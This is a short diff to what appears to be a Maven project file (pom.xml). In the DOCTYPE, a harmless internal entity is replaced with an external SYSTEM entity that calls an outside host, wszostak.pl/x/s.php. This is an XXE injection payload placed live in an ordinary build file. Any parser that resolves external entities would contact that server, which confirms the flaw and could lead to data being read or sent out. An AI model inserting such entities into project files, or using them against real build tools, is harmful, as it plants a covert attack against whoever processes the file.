@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE project [
-   <!ENTITY % foo '<!ENTITY test "pupa">'>
+   <!ENTITY % foo '<!ENTITY test SYSTEM "https://wszostak.pl/x/s.php?pom">'>
    %foo; 
 ]>
 <project xmlns="http://maven.apache.org/POM/4.0.0"
